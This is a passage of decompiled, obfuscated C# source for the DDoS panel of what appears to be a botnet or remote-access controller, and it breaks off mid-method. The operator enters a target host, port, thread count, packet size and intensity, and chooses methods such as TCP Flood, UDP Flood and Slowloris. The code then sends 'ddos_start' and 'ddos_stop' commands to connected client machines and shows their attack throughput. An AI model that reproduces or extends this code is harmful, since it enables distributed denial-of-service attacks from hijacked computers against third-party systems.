        this.vmethod_98().Image = Class131.smethod_24();
        this.vmethod_98().Location = new Point(0x330, 0x1c8);
        this.vmethod_98().Margin = new Padding(2);
        this.vmethod_98().Name = "pbDDOSSize";
        this.vmethod_98().Size = new Size(15, 15);
        this.vmethod_98().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_98().TabIndex = 0x88;
        this.vmethod_98().TabStop = false;
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        base.ClientSize = new Size(0x476, 0x1f5);
        base.Controls.Add(this.vmethod_98());
        base.Controls.Add(this.vmethod_96());
        base.Controls.Add(this.vmethod_94());
        base.Controls.Add(this.vmethod_92());
        base.Controls.Add(this.vmethod_90());
        base.Controls.Add(this.vmethod_86());
        base.Controls.Add(this.vmethod_88());
        base.Controls.Add(this.vmethod_84());
        base.Controls.Add(this.vmethod_82());
        base.Controls.Add(this.vmethod_80());
        base.Controls.Add(this.vmethod_76());
        base.Controls.Add(this.vmethod_78());
        base.Controls.Add(this.vmethod_0());
        base.Controls.Add(this.vmethod_2());
        base.Controls.Add(this.vmethod_6());
        base.Controls.Add(this.vmethod_8());
        base.Controls.Add(this.vmethod_10());
        base.Controls.Add(this.vmethod_12());
        base.Controls.Add(this.vmethod_14());
        base.Controls.Add(this.vmethod_16());
        base.Controls.Add(this.vmethod_18());
        base.Controls.Add(this.vmethod_20());
        base.Controls.Add(this.vmethod_22());
        base.Controls.Add(this.vmethod_24());
        base.Controls.Add(this.vmethod_28());
        base.Controls.Add(this.vmethod_38());
        this.DoubleBuffered = true;
        base.Name = "fDDOS";
        base.Opacity = 0.0;
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        base.StartPosition = FormStartPosition.CenterParent;
        this.Text = "DDoS";
        this.vmethod_28().ResumeLayout(false);
        this.vmethod_28().PerformLayout();
        this.vmethod_38().EndInit();
        this.vmethod_58().ResumeLayout(false);
        ((ISupportInitialize) this.vmethod_84()).EndInit();
        ((ISupportInitialize) this.vmethod_90()).EndInit();
        ((ISupportInitialize) this.vmethod_98()).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }

    public void method_0(string string_0, string string_1)
    {
        if (this.vmethod_38().InvokeRequired)
        {
            object[] args = new object[] { string_0, string_1 };
            this.vmethod_38().Invoke(new Delegate69(this.method_0), args);
        }
        else if (!Class130.concurrentDictionary_5.ContainsKey(string_0))
        {
            if (Operators.CompareString(string_1, null, true) == 0)
            {
                string_1 = Class130.concurrentDictionary_3[string_0].sUser;
            }
            cDOScli scli = new cDOScli();
            scli.USER = Class130.concurrentDictionary_3[string_0].USER;
            scli.Key = string_0;
            scli.TARGET_HOST = "N/A";
            scli.TARGET_PORT = "N/A";
            scli.PROTOCOL = "N/A";
            scli.METHOD = "N/A";
            scli.THREADS = "N/A";
            scli.PPS = "N/A";
            scli.DURATION = "N/A";
            scli.PACKET_SIZE = "N/A";
            scli.BYTES_SENT = "N/A";
            scli.INTENSITY = "N/A";
            scli.SPEED = "N/A";
            scli.STATUS = "N/A";
            scli.bJustConnected = true;
            int num = Enumerable.Count<string>(scli.idxValues) - 1;
            int index = 1;
            while (true)
            {
                if (index > num)
                {
                    Class130.concurrentDictionary_5.TryAdd(string_0, scli);
                    Class130.concurrentDictionary_5[string_0].Key = string_0;
                    this.concurrentStack_0.Push(scli);
                    break;
                }
                scli.idxValues[index] = "N/A";
                index++;
            }
        }
    }

    public void method_1(string string_0, string[] string_1)
    {
        if (!Class130.concurrentDictionary_5.ContainsKey(string_0))
        {
            this.method_0(string_0, null);
            this.method_1(string_0, string_1);
        }
        else if (this.vmethod_38().InvokeRequired)
        {
            object[] args = new object[] { string_0, string_1 };
            this.vmethod_38().Invoke(new Delegate70(this.method_1), args);
        }
        else
        {
            int num3;
            string left = string_1[8];
            if (Operators.CompareString(left, Conversions.ToString(0), true) == 0)
            {
                string_1[8] = "Maximum";
            }
            else if (Operators.CompareString(left, Conversions.ToString(1), true) == 0)
            {
                string_1[8] = "High";
            }
            else if (Operators.CompareString(left, Conversions.ToString(2), true) == 0)
            {
                string_1[8] = "Above normal";
            }
            else if (Operators.CompareString(left, Conversions.ToString(3), true) == 0)
            {
                string_1[8] = "Normal";
            }
            else if (Operators.CompareString(left, Conversions.ToString(4), true) == 0)
            {
                string_1[8] = "Below normal";
            }
            else if (Operators.CompareString(left, Conversions.ToString(5), true) == 0)
            {
                string_1[8] = "Low";
            }
            else if (Operators.CompareString(left, Conversions.ToString(6), true) == 0)
            {
                string_1[8] = "Minimum";
            }
            Class130.concurrentDictionary_5[string_0].idxValues[0] = Class130.concurrentDictionary_3[string_0].sUser;
            Class130.concurrentDictionary_5[string_0].idxValues[1] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[0], string.Empty, true) == 0, "N/A", string_1[0]));
            Class130.concurrentDictionary_5[string_0].idxValues[2] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[1], string.Empty, true) == 0, "N/A", string_1[1]));
            Class130.concurrentDictionary_5[string_0].idxValues[3] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[2], string.Empty, true) == 0, "N/A", string_1[2]));
            Class130.concurrentDictionary_5[string_0].idxValues[4] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[3], string.Empty, true) == 0, "N/A", string_1[3]));
            Class130.concurrentDictionary_5[string_0].idxValues[5] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[4], string.Empty, true) == 0, "N/A", string_1[4]));
            ref bool flagRef = ref false;
            double number = Conversion.Val(string_1[5]);
            string truePart = "N/A";
            int num4 = (int) (Operators.CompareString(string_1[5], string.Empty, true) == 0);
            int index = 6;
            string[] idxValues = Class130.concurrentDictionary_5[string_0].idxValues;
            ProjectData.ClearProjectError();
            string expression = string.Empty;
            if (number >= 1099511627776)
            {
                expression = Strings.Format((((number / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
            }
            else if (number >= 1073741824.0)
            {
                expression = Strings.Format(((number / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
            }
            else if (number >= 1048576.0)
            {
                expression = Strings.Format((number / 1024.0) / 1024.0, "#0.00") + " MiB";
            }
            else if (number >= 1024.0)
            {
                expression = Strings.Format(number / 1024.0, "#0.00") + " KiB";
            }
            else if (number < 1024.0)
            {
                expression = Conversions.ToString(Conversion.Fix(number)) + " B";
            }
            if (flagRef)
            {
                expression = Strings.Split(expression, " ", -1, CompareMethod.Text)[0];
            }
            string falsePart = (expression.Length <= 0) ? " 0 B" : expression;
            if (num3 != 0)
            {
                ProjectData.ClearProjectError();
            }
            idxValues[index] = Conversions.ToString(Interaction.IIf((bool) num4, truePart, falsePart));
            flagRef = ref false;
            number = Conversion.Val(string_1[6]);
            string str6 = "N/A";
            int num6 = (int) (Operators.CompareString(string_1[6], string.Empty, true) == 0);
            int num7 = 7;
            string[] strArray2 = Class130.concurrentDictionary_5[string_0].idxValues;
            ProjectData.ClearProjectError();
            expression = string.Empty;
            if (number >= 1099511627776)
            {
                expression = Strings.Format((((number / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
            }
            else if (number >= 1073741824.0)
            {
                expression = Strings.Format(((number / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
            }
            else if (number >= 1048576.0)
            {
                expression = Strings.Format((number / 1024.0) / 1024.0, "#0.00") + " MiB";
            }
            else if (number >= 1024.0)
            {
                expression = Strings.Format(number / 1024.0, "#0.00") + " KiB";
            }
            else if (number < 1024.0)
            {
                expression = Conversions.ToString(Conversion.Fix(number)) + " B";
            }
            if (flagRef)
            {
                expression = Strings.Split(expression, " ", -1, CompareMethod.Text)[0];
            }
            falsePart = (expression.Length <= 0) ? " 0 B" : expression;
            if (num3 != 0)
            {
                ProjectData.ClearProjectError();
            }
            strArray2[num7] = Conversions.ToString(Interaction.IIf((bool) num6, str6, falsePart + "/s"));
            Class130.concurrentDictionary_5[string_0].idxValues[8] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[7], string.Empty, true) == 0, "N/A", Conversion.Val(string_1[7])));
            Class130.concurrentDictionary_5[string_0].idxValues[9] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[8], string.Empty, true) == 0, "N/A", string_1[8]));
            flagRef = ref false;
            number = Conversion.Val(string_1[9]);
            string str8 = "N/A";
            int num8 = (int) (Operators.CompareString(string_1[9], string.Empty, true) == 0);
            int num9 = 10;
            string[] strArray3 = Class130.concurrentDictionary_5[string_0].idxValues;
            ProjectData.ClearProjectError();
            expression = string.Empty;
            if (number >= 1099511627776)
            {
                expression = Strings.Format((((number / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
            }
            else if (number >= 1073741824.0)
            {
                expression = Strings.Format(((number / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
            }
            else if (number >= 1048576.0)
            {
                expression = Strings.Format((number / 1024.0) / 1024.0, "#0.00") + " MiB";
            }
            else if (number >= 1024.0)
            {
                expression = Strings.Format(number / 1024.0, "#0.00") + " KiB";
            }
            else if (number < 1024.0)
            {
                expression = Conversions.ToString(Conversion.Fix(number)) + " B";
            }
            if (flagRef)
            {
                expression = Strings.Split(expression, " ", -1, CompareMethod.Text)[0];
            }
            falsePart = (expression.Length <= 0) ? " 0 B" : expression;
            if (num3 != 0)
            {
                ProjectData.ClearProjectError();
            }
            strArray3[num9] = Conversions.ToString(Interaction.IIf((bool) num8, str8, falsePart));
            Class130.concurrentDictionary_5[string_0].idxValues[11] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[10], string.Empty, true) == 0, "N/A", Class136.smethod_35((long) Math.Round(Conversion.Val(string_1[10])), true)));
            Class130.concurrentDictionary_5[string_0].idxValues[12] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[11], string.Empty, true) == 0, "N/A", string_1[11]));
            Class130.concurrentDictionary_5[string_0].bJustConnected = false;
            Class130.concurrentDictionary_5[string_0].sent_bytes = (long) Math.Round(Conversion.Val(string_1[5]));
            Class130.concurrentDictionary_5[string_0].speed_bytes = (long) Math.Round(Conversion.Val(string_1[6]));
            this.concurrentStack_1.Push(Class130.concurrentDictionary_5[string_0]);
        }
    }

    private void method_10(object sender, EventArgs e)
    {
        int num6;
        double num = 0.0;
        double num2 = 0.0;
        double num3 = 0.0;
        IEnumerator enumerator = this.vmethod_38().get_Objects().GetEnumerator();
        while (enumerator.MoveNext())
        {
            cDOScli current = (cDOScli) enumerator.Current;
            num += Conversion.Val(current.speed_bytes);
            num2 += Conversion.Val(current.PPS);
            num3 += Conversion.Val(current.THREADS);
        }
        this.vmethod_30().Text = "DDoS clients: " + Conversions.ToString(this.vmethod_38().get_Items().Count);
        this.vmethod_106().Text = "Threads: " + Conversions.ToString(num3);
        ref bool flagRef = ref false;
        double number = num;
        string str3 = "Speed: ";
        ToolStripStatusLabel label = this.vmethod_32();
        ProjectData.ClearProjectError();
        string expression = string.Empty;
        if (number >= 1099511627776)
        {
            expression = Strings.Format((((number / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
        }
        else if (number >= 1073741824.0)
        {
            expression = Strings.Format(((number / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
        }
        else if (number >= 1048576.0)
        {
            expression = Strings.Format((number / 1024.0) / 1024.0, "#0.00") + " MiB";
        }
        else if (number >= 1024.0)
        {
            expression = Strings.Format(number / 1024.0, "#0.00") + " KiB";
        }
        else if (number < 1024.0)
        {
            expression = Conversions.ToString(Conversion.Fix(number)) + " B";
        }
        if (flagRef)
        {
            expression = Strings.Split(expression, " ", -1, CompareMethod.Text)[0];
        }
        string str = (expression.Length <= 0) ? " 0 B" : expression;
        if (num6 != 0)
        {
            ProjectData.ClearProjectError();
        }
        label.Text = str3 + str + "/s";
        this.vmethod_34().Text = "PPS: " + Conversions.ToString(num2);
        this.vmethod_36().Text = "Selected clients: " + Conversions.ToString(Class130.fMain_0.vmethod_18().get_SelectedObjects().Count);
    }

    private void method_11(object sender, EventArgs e)
    {
        this.vmethod_94().Enabled = Conversions.ToBoolean(Interaction.IIf((this.vmethod_10().SelectedIndex == 3) | (this.vmethod_10().SelectedIndex == 4), false, true));
        this.vmethod_82().Enabled = Conversions.ToBoolean(Interaction.IIf((this.vmethod_10().SelectedIndex == 3) | (this.vmethod_10().SelectedIndex == 4), false, true));
        this.vmethod_76().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_10().SelectedIndex == (this.vmethod_10().Items.Count - 1), true, false));
    }

    private void method_12(object sender, EventArgs e)
    {
    }

    private void method_13(object sender, EventArgs e)
    {
        Interaction.MsgBox("Using too many threads in combination with a too large packet size and high intensity level may contribute to reduced of Internet connection speed, and even complete connection loss, on your client(s).\r\n\r\nNote: The output data rate is equivalent to threads * packet size, i.e. 4 threads with 4096 bytes of packet size = 16384 bytes output rate.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_14(object sender, EventArgs e)
    {
        Interaction.MsgBox("The level of intensity represents relative CPU and output data traffic limits.\r\nIt's recommended to use a moderate intensity level when possible in order to maintain stable performance on your clients(s).\r\n\r\nWarning: Use with caution! The highest intensity in combiation with a too large packet size and too many threads may contribute to reduced of Internet connection speed, and even complete connection loss, on your client(s).", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_15(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_18().Text, "Target IP or DNS", true) == 0)
        {
            this.vmethod_18().Text = string.Empty;
            this.vmethod_18().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_18().Font, FontStyle.Regular);
            this.vmethod_18().Font = font;
        }
    }

    private void method_16(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_18().Text, string.Empty, true) == 0)
        {
            this.vmethod_18().Text = "Target IP or DNS";
            this.vmethod_18().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_18().Font, FontStyle.Italic);
            this.vmethod_18().Font = font;
        }
    }

    private void method_17(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_14().Text) | (Conversion.Val(this.vmethod_14().Text) < 1.0)) | (Conversion.Val(this.vmethod_14().Text) > 65535.0))
        {
            this.vmethod_14().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_14().BackColor = Color.White;
        }
    }

    private void method_18(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_14().Text, "12345", true) == 0)
        {
            this.vmethod_14().Text = string.Empty;
            this.vmethod_14().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_14().Font, FontStyle.Regular);
            this.vmethod_14().Font = font;
        }
    }

    private void method_19(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_14().Text, string.Empty, true) == 0)
        {
            this.vmethod_14().Text = "12345";
            this.vmethod_14().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_14().Font, FontStyle.Italic);
            this.vmethod_14().Font = font;
        }
    }

    public void method_2(string string_0)
    {
        if (Class130.concurrentDictionary_5.ContainsKey(string_0))
        {
            if (this.vmethod_38().InvokeRequired)
            {
                object[] args = new object[] { string_0 };
                this.vmethod_38().Invoke(new Delegate68(this.method_2), args);
            }
            else
            {
                this.concurrentStack_2.Push(Class130.concurrentDictionary_5[string_0]);
                Class130.concurrentDictionary_5.TryRemove(string_0, out (cDOScli) out null);
            }
        }
    }

    private void method_20(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_82().Text, "/site.php?x=val1&y=val2", true) == 0)
        {
            this.vmethod_82().Text = string.Empty;
            this.vmethod_82().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_82().Font, FontStyle.Regular);
            this.vmethod_82().Font = font;
        }
    }

    private void method_21(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_82().Text, string.Empty, true) == 0)
        {
            this.vmethod_82().Text = "/site.php?x=val1&y=val2";
            this.vmethod_82().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_82().Font, FontStyle.Italic);
            this.vmethod_82().Font = font;
        }
    }

    private void method_22(object sender, EventArgs e)
    {
        string str = string.Empty;
        string text = string.Empty;
        string str3 = string.Empty;
        string str4 = string.Empty;
        string str5 = string.Empty;
        string str6 = string.Empty;
        string str7 = string.Empty;
        string s = string.Empty;
        if ((this.vmethod_18().TextLength < 3) | (Operators.CompareString(this.vmethod_18().Text, "Target IP or DNS", true) == 0))
        {
            Interaction.MsgBox("The target IP or DNS is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else if (((!Versioned.IsNumeric(this.vmethod_14().Text) | (Conversion.Val(this.vmethod_14().Text) < 0.0)) | (Conversion.Val(this.vmethod_14().Text) > 65535.0)) | (Operators.CompareString(this.vmethod_14().Text, "12345", true) == 0))
        {
            Interaction.MsgBox("The port is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else if ((!Versioned.IsNumeric(this.vmethod_94().Text) | (Conversion.Val(this.vmethod_94().Text) < 0.0)) | ((Conversion.Val(this.vmethod_94().Text) > 65535.0) & (this.vmethod_10().SelectedIndex != 3)))
        {
            Interaction.MsgBox("The size is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else if (((Conversion.Val(this.vmethod_94().Text) == 0.0) & (this.vmethod_82().TextLength < 1)) | ((Operators.CompareString(this.vmethod_94().Text, "/site.php?x=val1&y=val2", true) == 0) & (this.vmethod_10().SelectedIndex != 3)))
        {
            Interaction.MsgBox("The data is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else if (((this.vmethod_10().SelectedIndex == 4) | (this.vmethod_10().SelectedIndex == 5)) && (Conversion.Val(this.vmethod_6().SelectedItem.ToString()) > 512.0))
        {
            Interaction.MsgBox("Maximum allowed number of threads for TLS methods is 512.", MsgBoxStyle.Exclamation, Application.ProductName);
            this.vmethod_6().SelectedIndex = 0x1ff;
        }
        else
        {
            string str9;
            string sKey;
            Class136.Class138 class2;
            str = this.vmethod_6().SelectedItem.ToString();
            text = this.vmethod_18().Text;
            str3 = this.vmethod_14().Text;
            str6 = Conversions.ToString(this.vmethod_86().SelectedIndex);
            str7 = this.vmethod_94().Text;
            s = this.vmethod_82().Text;
            int selectedIndex = this.vmethod_76().SelectedIndex;
            if (selectedIndex == 0)
            {
                str5 = "tcp";
            }
            else if (selectedIndex == 1)
            {
                str5 = "udp";
            }
            switch (this.vmethod_10().SelectedIndex)
            {
                case 0:
                    str4 = "tcp";
                    break;

                case 1:
                    str4 = "udp";
                    break;

                case 2:
                    str4 = "slo";
                    break;

                case 3:
                    str4 = "tka";
                    break;

                case 4:
                    str4 = "ths";
                    break;

                case 5:
                    str4 = "tlf";
                    break;

                case 6:
                    str4 = "cus";
                    break;

                default:
                    break;
            }
            FastObjectListView view = Class130.fMain_0.vmethod_18();
            if (this.vmethod_22().Checked)
            {
                IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
                while (enumerator.MoveNext())
                {
                    CClient current = (CClient) enumerator.Current;
                    string[] textArray1 = new string[15];
                    textArray1[0] = Convert.ToBase64String(Encoding.UTF8.GetBytes(text.ToString().ToLower()));
                    textArray1[1] = "|";
                    textArray1[2] = str3;
                    textArray1[3] = "|";
                    textArray1[4] = str;
                    textArray1[5] = "|";
                    textArray1[6] = str4;
                    textArray1[7] = "|";
                    textArray1[8] = str5;
                    textArray1[9] = "|";
                    textArray1[10] = str6;
                    textArray1[11] = "|";
                    textArray1[12] = str7;
                    textArray1[13] = "|";
                    textArray1[14] = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
                    current.DDOS_LAST_SETTINGS = string.Concat(textArray1);
                    str9 = "ddos_start|" + current.DDOS_LAST_SETTINGS;
                    sKey = current.sKey;
                    class2 = new Class136.Class138();
                    class2.string_0 = sKey;
                    class2.string_1 = str9;
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                }
            }
            else
            {
                IEnumerator enumerator = view.get_Objects().GetEnumerator();
                while (enumerator.MoveNext())
                {
                    CClient current = (CClient) enumerator.Current;
                    string[] textArray2 = new string[15];
                    textArray2[0] = Convert.ToBase64String(Encoding.UTF8.GetBytes(text.ToString().ToLower()));
                    textArray2[1] = "|";
                    textArray2[2] = str3;
                    textArray2[3] = "|";
                    textArray2[4] = str;
                    textArray2[5] = "|";
                    textArray2[6] = str4;
                    textArray2[7] = "|";
                    textArray2[8] = str5;
                    textArray2[9] = "|";
                    textArray2[10] = str6;
                    textArray2[11] = "|";
                    textArray2[12] = str7;
                    textArray2[13] = "|";
                    textArray2[14] = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
                    current.DDOS_LAST_SETTINGS = string.Concat(textArray2);
                    str9 = "ddos_start|" + current.DDOS_LAST_SETTINGS;
                    sKey = current.sKey;
                    class2 = new Class136.Class138();
                    class2.string_0 = sKey;
                    class2.string_1 = str9;
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                }
            }
            view = null;
        }
    }

    private void method_23(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_94().Text) | (Conversion.Val(this.vmethod_94().Text) < 0.0)) | (Conversion.Val(this.vmethod_94().Text) > 65535.0))
        {
            this.vmethod_94().Text = "0";
        }
        this.vmethod_82().Enabled = Conversions.ToBoolean(Interaction.IIf((this.vmethod_94().TextLength == 0) | (Operators.CompareString(this.vmethod_94().Text, "0", true) == 0), true, false));
    }

    private void method_24(object sender, EventArgs e)
    {
        Interaction.MsgBox("Packets with random content of the given size will be used as output data.\r\nYou may also leave the value as 0 in order to use custom data instead.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_25(object sender, EventArgs e)
    {
        string str;
        string sKey;
        Class136.Class138 class2;
        FastObjectListView view = Class130.fMain_0.vmethod_18();
        if (!this.vmethod_22().Checked)
        {
            IEnumerator enumerator = view.get_Objects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                str = "ddos_stop|1";
                sKey = ((CClient) enumerator.Current).sKey;
                class2 = new Class136.Class138();
                class2.string_0 = sKey;
                class2.string_1 = str;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        else if (view.get_SelectedObjects() != null)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                str = "ddos_stop|1";
                sKey = ((CClient) enumerator.Current).sKey;
                class2 = new Class136.Class138();
                class2.string_0 = sKey;
                class2.string_1 = str;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        view = null;
    }

    private void method_26(object sender, EventArgs e)
    {
    }

    private void method_27(object sender, EventArgs e)
    {
        FastObjectListView view = this.vmethod_38();
        if (view.get_SelectedObjects() != null)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                string str = "ddos_stop|1";
                string key = ((cDOScli) enumerator.Current).Key;
                Class136.Class138 class2 = new Class136.Class138();
                class2.string_0 = key;
                class2.string_1 = str;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        view = null;
    }

    private void method_28(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_38();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cDOScli current = (cDOScli) enumerator.Current;
                string[] textArray1 = new string[0x1a];
                textArray1[0] = current.USER;
                textArray1[1] = "\t";
                textArray1[2] = current.TARGET_HOST;
                textArray1[3] = "\t";
                textArray1[4] = current.TARGET_PORT;
                textArray1[5] = "\t";
                textArray1[6] = current.PROTOCOL;
                textArray1[7] = "\t";
                textArray1[8] = current.METHOD;
                textArray1[9] = "\t";
                textArray1[10] = current.THREADS;
                textArray1[11] = "\t";
                textArray1[12] = current.BYTES_SENT;
                textArray1[13] = "\t";
                textArray1[14] = current.SPEED;
                textArray1[15] = "\t";
                textArray1[0x10] = current.PPS;
                textArray1[0x11] = "\t";
                textArray1[0x12] = current.PACKET_SIZE;
                textArray1[0x13] = "\t";
                textArray1[20] = current.INTENSITY;
                textArray1[0x15] = "\t";
                textArray1[0x16] = current.STATUS;
                textArray1[0x17] = "\t";
                textArray1[0x18] = current.DURATION;
                textArray1[0x19] = "\r\n";
                builder.Append(string.Concat(textArray1));
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_29(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_38();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_Objects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cDOScli current = (cDOScli) enumerator.Current;
                string[] textArray1 = new string[0x1a];
                textArray1[0] = current.USER;
                textArray1[1] = "\t";
                textArray1[2] = current.TARGET_HOST;
                textArray1[3] = "\t";
                textArray1[4] = current.TARGET_PORT;
                textArray1[5] = "\t";
                textArray1[6] = current.PROTOCOL;
                textArray1[7] = "\t";
                textArray1[8] = current.METHOD;
                textArray1[9] = "\t";
                textArray1[10] = current.THREADS;
                textArray1[11] = "\t";
                textArray1[12] = current.BYTES_SENT;
                textArray1[13] = "\t";
                textArray1[14] = current.SPEED;
                textArray1[15] = "\t";
                textArray1[0x10] = current.PPS;
                textArray1[0x11] = "\t";
                textArray1[0x12] = current.PACKET_SIZE;
                textArray1[0x13] = "\t";
                textArray1[20] = current.INTENSITY;
                textArray1[0x15] = "\t";
                textArray1[0x16] = current.STATUS;
                textArray1[0x17] = "\t";
                textArray1[0x18] = current.DURATION;
                textArray1[0x19] = "\r\n";
                builder.Append(string.Concat(textArray1));
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    public void method_3()
    {
        if (this.vmethod_38().InvokeRequired)
        {
            this.vmethod_38().Invoke(new Delegate65(this.method_3), new object[0]);
        }
        else if (this.concurrentStack_0.Count > 0)
        {
            this.vmethod_38().AddObjects(Enumerable.ToList<cDOScli>(this.concurrentStack_0));
            this.concurrentStack_0.Clear();
        }
    }

    public void method_4()
    {
        if (this.vmethod_38().InvokeRequired)
        {
            this.vmethod_38().Invoke(new Delegate67(this.method_4), new object[0]);
        }
        else if (this.concurrentStack_1.Count > 0)
        {
            this.vmethod_38().RefreshObjects(Enumerable.ToList<cDOScli>(this.concurrentStack_1));
            this.concurrentStack_1.Clear();
        }
    }

    public void method_5()
    {
        if (this.vmethod_38().InvokeRequired)
        {
            this.vmethod_38().Invoke(new Delegate66(this.method_5), new object[0]);
        }
        else if (this.concurrentStack_2.Count > 0)
        {
            this.vmethod_38().RemoveObjects(Enumerable.ToList<cDOScli>(this.concurrentStack_2));
            this.concurrentStack_2.Clear();
        }
    }

    private void method_6(object sender, FormatRowEventArgs e)
    {
        cDOScli scli = (cDOScli) e.get_Model();
        if (scli.bJustConnected)
        {
            e.get_Item().BackColor = Color.LimeGreen;
        }
        else if (!scli.pending_dc & !scli.pending_dc_timeout)
        {
            e.get_Item().BackColor = Color.White;
        }
        else if (scli.pending_dc & scli.pending_dc_timeout)
        {
            e.get_Item().BackColor = Color.Yellow;
            if (e.get_Item().Focused)
            {
                e.get_ListView().DeselectAll();
            }
            e.get_Item().Selected = false;
        }
        else if (scli.pending_dc & !scli.pending_dc_timeout)
        {
            e.get_Item().BackColor = Color.Red;
            if (e.get_Item().Focused)
            {
                e.get_ListView().DeselectAll();
            }
            e.get_Item().Selected = false;
        }
    }

    private void method_7(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_38().get_Items().GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    public void method_8()
    {
        base.Width = 0x4ce;
        base.Height = 540;
        this.vmethod_38().VirtualMode = true;
        this.vmethod_38().set_View(View.Details);
        this.vmethod_38().FullRowSelect = true;
        this.vmethod_38().set_OwnerDraw(true);
        this.vmethod_38().get_Columns()[0].Width = 180;
        this.vmethod_38().get_Columns()[1].Width = 120;
        this.vmethod_38().get_Columns()[2].Width = 60;
        this.vmethod_38().get_Columns()[3].Width = 80;
        this.vmethod_38().get_Columns()[4].Width = 60;
        this.vmethod_38().get_Columns()[5].Width = 60;
        this.vmethod_38().get_Columns()[6].Width = 80;
        this.vmethod_38().get_Columns()[7].Width = 80;
        this.vmethod_38().get_Columns()[8].Width = 80;
        this.vmethod_38().get_Columns()[9].Width = 80;
        this.vmethod_38().get_Columns()[10].Width = 80;
        this.vmethod_38().get_Columns()[11].Width = 120;
        this.vmethod_38().get_Columns()[12].Width = 120;
        this.vmethod_38().GridLines = Class135.smethod_0().Gridlines;
        this.vmethod_10().Items.Add("TCP Flood");
        this.vmethod_10().Items.Add("UDP Flood");
        this.vmethod_10().Items.Add("Slowloris");
        this.vmethod_10().Items.Add("TCP Keep-Alive");
